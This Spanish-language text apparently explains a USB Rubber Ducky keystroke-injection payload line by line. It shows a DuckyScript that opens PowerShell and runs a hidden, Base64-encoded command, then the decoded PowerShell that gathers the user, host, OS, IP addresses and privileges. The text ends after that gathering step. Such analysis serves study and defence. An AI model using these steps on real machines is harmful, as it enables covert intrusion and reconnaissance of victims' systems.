# Explicación línea a línea

## 🔹 DuckyScript

| Línea | Función |
|-------|---------|
| `DUCKY_LANG es` | Distribución de teclado española |
| `DELAY 1000` | Espera a que Windows cargue el driver HID |
| `GUI r` | Abre el diálogo **Ejecutar** (Win+R) |
| `DELAY 500` | Espera a que aparezca el diálogo |
| `STRING powershell` + `ENTER` | Abre una ventana de PowerShell (visibilidad reducida) |
| `DELAY 1200` | Espera a que PowerShell cargue |
| `STRING powershell -WindowStyle Hidden -EncodedCommand ...` + `ENTER` | Lanza el payload **oculto** |
| `ENTER` | Ejecuta el comando |

### Flags de PowerShell

- `-WindowStyle Hidden`: ventana invisible al usuario.
- `-EncodedCommand`: recibe el comando en Base64 UTF-16LE.
- (Común añadir `-ep bypass`, pero **no aparece** en tu payload).

## 🔹 Script PowerShell (decodificado)

### Recolección

```powershell
$u  = whoami
$h  = hostname
$so = (Get-CimInstance Win32_OperatingSystem).Caption
$ip = ((Get-NetIPAddress -AddressFamily IPv4 |
        Where-Object InterfaceAlias -notlike '*Loopback*').IPAddress -join ', ')
$p  = (whoami /priv | Out-String).Trim()